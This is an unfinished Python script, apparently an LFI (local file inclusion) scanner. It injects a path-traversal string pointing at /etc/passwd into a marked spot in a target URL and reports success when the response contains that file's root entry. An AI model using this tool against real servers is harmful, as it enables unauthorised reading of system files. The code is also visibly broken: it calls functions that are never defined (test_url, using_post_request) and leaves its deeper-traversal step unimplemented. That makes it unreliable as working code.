#!/usr/bin/env python3

import requests
import argparse
from colorama import Fore , Style


#description of the tool
tool_description = ""	#to be filled
parser = argparse.ArgumentParser(description = tool_description)

parser.add_argument("URL" , help="specify the URL to be tested for LFI")
parser.add_argument("METHOD" , help="specify whether to use GET/POST request")
arguments = parser.parse_args();


def using_get_request():
	URL = arguments.URL
	print(f'[+]URL = "{URL}"')
	index_to_be_injected = URL.find("*")	#find() returns the index of the character if present
	print("[+]Found injection point in URL")
	if URL[index_to_be_injected - 1] == "=":
		print("[+]URL seems to be valid")
	
	first_sled = "/"
	other_sled = "../"
	files = {
		"etc/passwd" : "root:x:0:0:" , 
	}							#to be filled with more file names that are world readable generally
	
	#for first sled checks
	LFI_FOUND = False
	for current_file in files:
		URL = arguments.URL
		file_to_be_checked = first_sled + current_file
		URL = URL.replace("*" , file_to_be_checked)
		print(f"[+]Testing for URL: {URL}")
		LFI_FOUND = test_url(URL , files[current_file] , LFI_FOUND)
	if LFI_FOUND == False:
		print(Fore.RED + "[-]No LFI found at layer 0" + Style.RESET_ALL)
		print("[+]Trying deeper")
		
		
		


	
def test_url_get(URL , key_string , LFI_FOUND):
	response = requests.get(URL)
	if response.status_code >=200 and response.status_code < 400:
		if response.text.find(key_string) > -1:
			print(Fore.YELLOW + f"[+]LFI found for {URL}" + Style.RESET_ALL)
			LFI_FOUND = True
		return LFI_FOUND				#No matter whether the LFI_FOUND is, we have to return it. That's why it is aligned with if.
	else:
		print(Fore.RED + f"[-]Request wasn't successful! Status code = {response.status_code}" + Style.RESET_ALL)
				
	






###### MAIN ########
if arguments.METHOD.lower() == "get":				#lower() for case insensitive comparision
	using_get_request()

elif arguments.METHOD.lower() == "post":
	using_post_request()

else:
	print("Invalid Method!")
